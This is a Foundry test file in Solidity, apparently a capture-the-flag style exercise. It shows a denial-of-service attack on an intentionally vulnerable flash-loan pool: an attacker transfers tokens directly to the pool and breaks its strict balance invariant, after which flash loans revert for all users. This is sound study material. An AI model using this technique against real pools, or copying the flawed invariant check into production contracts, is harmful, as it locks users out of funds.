// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/Token.sol";
import "../src/VulnerablePool.sol";

contract UnstoppableTest is Test {
    MyToken token;
    VulnerablePool pool;
    address user = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        // 1) Deploy token
        token = new MyToken("My Test Token", "MTK");

        // 2) Deploy pool
        pool = new VulnerablePool(address(token));

        // 3) Mint tokens for user
        token.mint(user, 100 ether);

        // 4) Approve and deposit into pool
        vm.startPrank(user);
        token.approve(address(pool), type(uint256).max);
        pool.deposit(100 ether);
        vm.stopPrank();

        // 5) Sanity check
        assertEq(token.balanceOf(address(pool)), pool.accountingBalance());
    }

    /// @notice Demonstrates that sending tokens directly to the pool breaks the flashLoan invariant
    function testBreakByDirectTransfer() public {
        // attacker mints tokens
        vm.prank(attacker);
        token.mint(attacker, 10 ether);

        // attacker transfers directly to pool (bypassing deposit)
        vm.prank(attacker);
        token.transfer(address(pool), 10 ether);

        // flashLoan should now revert due to broken invariant
        vm.expectRevert(bytes("invariant violated"));
        pool.flashLoan(1 ether, user, "");
    }

    /// @notice Optional: demonstrate pool still works normally before attacker
    function testFlashLoanBeforeAttack() public {
    // mint and deposit to ensure invariant holds
    	token.mint(user, 50 ether);
    	vm.startPrank(user);
    	token.approve(address(pool), type(uint256).max);
    	pool.deposit(50 ether);
    	vm.stopPrank();

    // flashLoan should succeed now
    	pool.flashLoan(10 ether, user, "");
    }
}


